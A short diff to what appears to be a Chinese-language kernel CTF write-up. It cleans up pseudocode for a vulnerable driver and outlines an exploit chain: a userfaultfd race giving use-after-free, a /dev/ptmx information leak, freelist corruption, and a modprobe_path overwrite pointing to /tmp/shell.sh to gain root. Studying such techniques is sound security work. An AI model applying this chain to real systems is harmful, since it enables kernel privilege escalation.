@@ -13,14 +13,14 @@ def ioctl(fd, cmd, arg):
 	elif cmd == 0x6666:
 		dele()
 
-def add()：
-		size = mychunk.size
-		read_lock()
-		idx = search_empty_buf()
-		write_lock()
-		mybuf[idx].ptr = kmalloc(size)
-		myuf[idx].size = size
-		unlock()
+def add():
+	size = mychunk.size
+	read_lock()
+	idx = search_empty_buf()
+	write_lock()
+	mybuf[idx].ptr = kmalloc(size)
+	myuf[idx].size = size
+	unlock()
 def get():
 	idx = mychunk.idx
 	copy_user_generic_unrolled(mychunk.ptr, mybuf[idx].ptr, mybuf[idx].size)
@@ -45,9 +45,9 @@ def dele():
 2. 利用userfaultfd修改`chunk→freelist`指针
 
 ```c
-1. 信息泄露
+// 1. 信息泄露
 get(0) -> userfaultfd -> dele(0) -> open("/dev/ptmx") -> return get(0)
-2. 修改modprobe_path
+// 2. 修改modprobe_path
 edit(0) -> userfaultfd -> dele(0) -> freelist=modeprobe_path -> add(0x20)
 => edit(1, "/tmp/shell.sh")
 execve(badfile)
